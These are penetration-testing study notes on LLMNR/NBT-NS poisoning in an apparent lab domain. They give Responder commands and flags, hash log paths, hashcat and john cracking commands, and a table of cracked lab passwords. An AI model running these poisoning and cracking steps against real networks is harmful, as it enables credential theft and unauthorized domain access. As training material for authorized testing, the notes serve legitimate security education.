# Section 6 — LLMNR/NBT-NS Poisoning from Linux

## How It Works

**LLMNR** (Link-Local Multicast Name Resolution) and **NBT-NS** (NetBIOS Name Service) are Windows fallback protocols used when DNS resolution fails.

Attack flow:
1. A host tries to reach `\\printer01.inlanefreight.local` — DNS doesn't know it
2. Host broadcasts to the entire local network: "anyone know this host?"
3. **We respond** (via Responder) pretending we are that host
4. Victim sends us an authentication request containing their **NTLMv2 hash**
5. We crack the hash offline → cleartext password → domain foothold

**Key ports used:**
- LLMNR → UDP 5355
- NBT-NS → UDP 137

**Why it works:** Any host on the network can reply to these broadcasts — there's no verification.

---

## What We Capture

- **NTLMv2 hashes** (most common) — crack offline, cannot be used for pass-the-hash directly
- **NTLMv1 hashes** — older, weaker, crack faster
- Sometimes **cleartext credentials** (via HTTP/WPAD)

Captured hashes can also be used for **SMB Relay attacks** (covered in Lateral Movement module) if SMB signing is not required — no cracking needed.

---

## Responder

### Start (active poisoning)
```bash
sudo responder -I ens224
```

### Common flags
| Flag | Effect |
|------|--------|
| `-I` | Interface to listen on |
| `-A` | Analyze mode only — no poisoning (passive recon) |
| `-w` | Start WPAD rogue proxy — captures all HTTP traffic from IE with auto-detect enabled |
| `-f` | Fingerprint remote OS/version |
| `-v` | Verbose output |
| `-b` | Return Basic HTTP auth instead of NTLM |
| `--lm` | Force LM downgrade (XP/2003 and earlier) |

### Typical usage on an engagement
```bash
# Run in a tmux pane and leave it — collect hashes while doing other enum
sudo responder -I ens224 -wf
```

### Log locations
```
/usr/share/responder/logs/

# Hash files named by format:
SMB-NTLMv2-SSP-172.16.5.25.txt
HTTP-NTLMv2-172.16.5.200.txt
Proxy-Auth-NTLMv2-172.16.5.200.txt

# All hashes also stored in SQLite DB (configured in Responder.conf)
```

### Required ports (must be free on attack host)
```
UDP 137, 138, 53, 389, 1434, 5355, 5353
TCP 80, 135, 139, 389, 445, 1433, 3141, 25, 110, 587, 3128
```

Disable unneeded rogue servers in `/usr/share/responder/Responder.conf`.

---

## Cracking NTLMv2 Hashes

```bash
# Hashcat — mode 5600 for NTLMv2
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.25.txt /usr/share/wordlists/rockyou.txt

# John
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Hash mode reference:** [hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- NTLMv2 = mode `5600`
- NTLMv1 = mode `5500`
- NTLM (pass-the-hash style) = mode `1000`

> NTLMv2 can be slow to crack even on GPU rigs — long/complex passwords may not crack in assessment time. Prioritize hashes for high-value accounts.

---

## Tools Comparison

| Tool | Platform | Notes |
|------|----------|-------|
| **Responder** | Linux (Python) | Go-to for Linux attack hosts |
| **Inveigh** | Windows (C# / PowerShell) | Use when on a Windows attack host |
| **Metasploit** | Both | Built-in poisoning modules |

---

## Lab Credentials Captured (INLANEFREIGHT.LOCAL)

| User | Password | Source |
|------|----------|--------|
| backupagent | `h1backup55` | Responder NTLMv2 → Hashcat |
| wley | `transporter@4` | Responder NTLMv2 → Hashcat |

---

## Exam Notes

- **Always run Responder in a tmux pane** — let it collect in the background while you do other enumeration
- `-A` (analyze) = safe/passive. No `-A` = active poisoning — make sure you're authorized
- WPAD (`-w`) is high value in large orgs — captures HTTP auth from IE users automatically
- NTLMv2 hashes ≠ NTLM hashes — you **cannot** pass NTLMv2, you must crack it first
- If SMB signing is not required → consider SMB relay instead of cracking (faster foothold)
- Hash format in log filename tells you everything: `MODULE-HASHTYPE-CLIENT_IP.txt`
- After cracking → low-priv domain user account → begin credentialed enumeration
